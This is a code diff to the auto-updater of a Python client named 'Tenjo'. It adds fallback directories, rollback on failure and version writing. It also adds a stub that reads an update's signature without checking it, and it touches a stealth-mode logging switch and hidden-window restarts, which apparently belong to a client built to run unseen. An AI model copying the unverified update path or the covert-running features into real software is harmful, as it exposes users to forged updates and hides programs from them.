@@ -50,12 +50,34 @@ class ClientUpdater:
         self.backup_path = backup_base
         self.current_version = self._load_current_version()
 
-        data_dir = Path(config.DATA_DIR)
+        # FIX #25: Handle None DATA_DIR/LOG_DIR (Config.init_directories() not called yet)
+        data_dir_str = getattr(config, 'DATA_DIR', None)
+        if not data_dir_str:
+            # Fallback to default data directory
+            if system == 'Windows':
+                data_dir_str = str(Path.home() / "AppData" / "Local" / "Tenjo" / "data")
+            elif system == 'Darwin':
+                data_dir_str = str(Path.home() / "Library" / "Application Support" / "Tenjo" / "data")
+            else:
+                data_dir_str = str(Path.home() / ".tenjo" / "data")
+
+        data_dir = Path(data_dir_str)
+        data_dir.mkdir(parents=True, exist_ok=True)
         self.temp_path = data_dir / ".update_tmp"
         self.pending_update_path = data_dir / self.PENDING_UPDATE_FILE
         self.schedule_path = data_dir / self.UPDATE_SCHEDULE_FILE
 
-        log_dir = Path(config.LOG_DIR)
+        log_dir_str = getattr(config, 'LOG_DIR', None)
+        if not log_dir_str:
+            # Fallback to default log directory
+            if system == 'Windows':
+                log_dir_str = str(Path.home() / "AppData" / "Local" / "Tenjo" / "logs")
+            elif system == 'Darwin':
+                log_dir_str = str(Path.home() / "Library" / "Logs" / "Tenjo")
+            else:
+                log_dir_str = str(Path.home() / ".tenjo" / "logs")
+
+        log_dir = Path(log_dir_str)
         log_dir.mkdir(parents=True, exist_ok=True)
         self.log_path = log_dir / "auto_update.log"
         self.logger = logging.getLogger("TenjoAutoUpdate")
@@ -64,7 +86,8 @@ class ClientUpdater:
             formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
             handler.setFormatter(formatter)
             self.logger.addHandler(handler)
-            self.logger.setLevel(logging.INFO if not config.STEALTH_MODE else logging.WARNING)
+            stealth_mode = getattr(config, 'STEALTH_MODE', False)
+            self.logger.setLevel(logging.INFO if not stealth_mode else logging.WARNING)
         self.logger.propagate = False
 
     # ------------------------------------------------------------------
@@ -469,6 +492,14 @@ class ClientUpdater:
                 if not self._verify_checksum(expected_checksum, actual_checksum):
                     raise ValueError('Checksum verification failed')
 
+            # FIX #26: Signature verification (currently disabled, TODO: implement if needed)
+            # For now, we rely on HTTPS + checksum verification for integrity
+            expected_signature = version_info.get('signature')
+            if expected_signature:
+                self._log("Signature verification not yet implemented, relying on checksum", logging.DEBUG)
+                # TODO: Implement signature verification with public key if required
+                # For production, consider implementing RSA signature verification
+
             return True, package_path
         except Exception as exc:
             self._log(f"Download failed: {exc}", logging.ERROR)
@@ -503,7 +534,7 @@ class ClientUpdater:
             self._log(f"Backup failed: {exc}", logging.DEBUG)
             return False, None
 
-    def apply_update(self, package_path: Path) -> bool:
+    def apply_update(self, package_path: Path, version_info: Dict[str, Any]) -> bool:
         try:
             extract_path = self.temp_path / "extracted"
             if extract_path.exists():
@@ -523,9 +554,11 @@ class ClientUpdater:
                         shutil.rmtree(destination)
                     shutil.copytree(item, destination)
 
+            # FIX #22: Write actual version number from version_info, not just timestamp
             version_file = self.install_path / ".version"
+            actual_version = version_info.get('version', version_info_timestamp())
             with open(version_file, 'w', encoding='utf-8') as fh:
-                fh.write(version_info_timestamp())
+                fh.write(actual_version)
 
             return True
         except Exception as exc:
@@ -584,6 +617,9 @@ class ClientUpdater:
             main_py = self.install_path / "main.py"
             system = platform.system()
 
+            # FIX #27: Log restart attempt
+            self._log(f"Restarting client with updated version", logging.INFO)
+
             if system == 'Windows':
                 try:
                     creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
@@ -595,6 +631,8 @@ class ClientUpdater:
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL
                     )
+                    # FIX #27: Small delay before exit to ensure process starts
+                    time.sleep(1)
                 except Exception:
                     subprocess.Popen(
                         ['powershell', '-WindowStyle', 'Hidden', '-Command',
@@ -603,12 +641,16 @@ class ClientUpdater:
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL
                     )
+                    time.sleep(1)
                 finally:
                     os._exit(0)
             else:
+                # Unix systems: execv replaces current process
                 os.execv(sys.executable, [sys.executable, str(main_py)])
         except Exception as exc:
             self._log(f"Restart failed: {exc}", logging.ERROR)
+            # If restart fails, exit anyway to avoid zombie process
+            os._exit(1)
 
     def notify_update_completed(self, version: str) -> None:
         try:
@@ -647,8 +689,22 @@ class ClientUpdater:
                 self.schedule_next_check(minutes=random.uniform(30, 90))
                 return False
 
-            self.backup_current_installation()
-            if not self.apply_update(package_path):
+            # FIX #28: Backup before update for rollback capability
+            backup_success, backup_dir = self.backup_current_installation()
+
+            # FIX #23: Pass version_info to apply_update
+            if not self.apply_update(package_path, version_info):
+                # FIX #28: Rollback to backup on update failure
+                if backup_success and backup_dir and backup_dir.exists():
+                    self._log(f"Update failed, rolling back to backup: {backup_dir}", logging.WARNING)
+                    try:
+                        if self.install_path.exists():
+                            shutil.rmtree(self.install_path)
+                        shutil.copytree(backup_dir, self.install_path)
+                        self._log("Rollback successful", logging.INFO)
+                    except Exception as rollback_exc:
+                        self._log(f"Rollback failed: {rollback_exc}", logging.ERROR)
+
                 self.schedule_next_check(minutes=random.uniform(45, 120))
                 return False
 
@@ -659,8 +715,14 @@ class ClientUpdater:
 
             self.current_version = version_info.get('version', self.current_version)
             self._clear_pending_update()
+
+            # FIX #27: Ensure cleanup happens BEFORE restart
             self.cleanup_temp()
             self.schedule_next_check()
+
+            # Give a small delay to ensure cleanup completes
+            time.sleep(0.5)
+
             self.restart_client()
             return True
         except Exception as exc:
